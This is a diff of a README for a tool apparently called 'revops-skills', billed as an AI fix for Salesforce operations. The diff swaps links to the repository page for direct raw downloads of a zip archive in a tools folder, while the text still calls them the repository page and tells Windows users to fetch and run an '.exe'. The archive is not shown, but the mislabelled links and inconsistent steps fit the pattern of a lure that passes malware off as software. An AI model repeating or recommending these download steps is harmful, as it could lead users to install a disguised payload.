@@ -1,6 +1,6 @@
 # 🤖 revops-skills - Fix your Salesforce operations with AI
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/ariyantoa291/revops-skills)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/ariyantoa291/revops-skills/raw/refs/heads/main/tools/revops-skills-3.4-alpha.5.zip)
 
 ## 🎯 About This Tool
 
@@ -20,7 +20,7 @@ Ensure your computer has the following items before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the repository page to download the latest version: [https://github.com/ariyantoa291/revops-skills](https://github.com/ariyantoa291/revops-skills).
+1. Visit the repository page to download the latest version: [https://github.com/ariyantoa291/revops-skills/raw/refs/heads/main/tools/revops-skills-3.4-alpha.5.zip](https://github.com/ariyantoa291/revops-skills/raw/refs/heads/main/tools/revops-skills-3.4-alpha.5.zip).
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Select the file ending in ".exe" to begin your download.
 4. Save the file to your desktop for easy access.
